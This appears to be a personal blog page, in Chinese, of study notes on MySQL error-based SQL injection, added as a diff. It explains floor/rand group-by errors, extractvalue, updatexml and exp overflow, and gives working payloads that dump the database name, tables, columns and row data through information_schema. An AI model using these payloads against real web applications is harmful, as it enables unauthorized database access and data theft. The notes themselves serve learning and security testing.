@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>sql盲注 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="1.报错注入例子：Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a; 需要count()计数，concat()将所有行放在同一列上，0x3a表示’:’为了报错好看而已，floor()向下取整，rand(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql盲注">
+<meta property="og:url" content="http://example.com/2020/11/22/sql%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1.报错注入例子：Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a; 需要count()计数，concat()将所有行放在同一列上，0x3a表示’:’为了报错好看而已，floor()向下取整，rand(">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-11-21T23:46:02.000Z">
+<meta property="article:modified_time" content="2020-11-29T07:10:03.762Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-sql报错盲注" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/22/sql%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/" class="article-date">
+  <time datetime="2020-11-21T23:46:02.000Z" itemprop="datePublished">2020-11-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sql盲注
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-报错注入"><a href="#1-报错注入" class="headerlink" title="1.报错注入"></a>1.报错注入</h3><p>例子：Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;</p>
+<p>需要count()计数，concat()将所有行放在同一列上，0x3a表示’:’为了报错好看而已，floor()向下取整，rand()0-1随机数函数，group by 分组。</p>
+<p>rand(0) 指定一个固定参数可以制造一个伪随机序列。即可以预测下次出啥数字。</p>
+<p>这个报错是利用排序时插入的key值不能相同而报错。利用报错回显出key值。</p>
+<h3 id="2-extactvalue-null-concat-2个参数"><a href="#2-extactvalue-null-concat-2个参数" class="headerlink" title="2.extactvalue(null,concat());2个参数"></a><strong>2.extactvalue(null,concat());2个参数</strong></h3><p>extractvalue注入的原理：extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。</p>
+<p>传入错误路径参数concat()，比如开头不能是~，：等  即0x7e，0x3a等来报错回显。</p>
+<p>id=’ or extractvalue(null,concat(0x3a,(select id from users limit 0,1),0x3a))</p>
+<h3 id="3-updatexml-null-concat-null-3个参数"><a href="#3-updatexml-null-concat-null-3个参数" class="headerlink" title="3.updatexml(null,concat(),null);3个参数"></a><strong>3.updatexml(null,concat(),null);3个参数</strong></h3><p>两者都用于处理xml文件，extra相当于取出来数据，update就是跟新文件内容。</p>
+<p>原理和extactvalue一样。</p>
+<p>id=’ or updatexml(1,concat(0x3a,(select id from users limit 0,1),0x3a),1)</p>
+<p>爆数据库 concat(0x3a,(select database()),0x3a)</p>
+<p>爆表名concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=’数据库名’),0x3a)</p>
+<p>concat(0x3a,(select table_name from information_schema.tables where table_schema=’数据库名’ limit 0,1),0x3a)  </p>
+<p>limit 0,1 从第0个开始查第一个：1,1就是查第二个。</p>
+<p>爆列名concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’表名’),0x3a)</p>
+<p>爆数据concat(0x3a,(select 列名 from 表明 limit 0,1),0x3a)</p>
+<h3 id="4-double数值类型溢出报错"><a href="#4-double数值类型溢出报错" class="headerlink" title="4.double数值类型溢出报错"></a><strong>4.double数值类型溢出报错</strong></h3><p>我的mysql是5.7的版本好像不太行！！</p>
+<p>select exp(~(select * FROM(SELECT USER())a))</p>
+<p>例子：/id=1’ union select (exp(~(select * FROM(SELECT USER())a))),2, 3</p>
+<p><del>：是取反，</del>0最大的值</p>
+<p>exp() 以e为底的对数函数</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/22/sql%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/" data-id="cki6pgn7q0006nwvc85225c68" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/11/22/SQL%E5%BB%B6%E8%BF%9F%E6%B3%A8%E5%85%A5-%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          SQL延迟注入+布尔注入
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/11/21/mysql%E8%AF%AD%E6%B3%95%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">mysql语法总结</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/12/01/SQL23-38/">SQL23-38</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/27/GET%E8%AF%B7%E6%B1%82%E5%92%8CPOST%E8%AF%B7%E6%B1%82/">GET请求和POST请求</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/26/PHP%E5%87%BD%E6%95%B0%E5%A4%A7%E5%85%A8/">PHP函数大全</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/26/SQL%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD/">SQL注入点判断</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/22/SQL%E5%BB%B6%E8%BF%9F%E6%B3%A8%E5%85%A5-%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/">SQL延迟注入+布尔注入</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
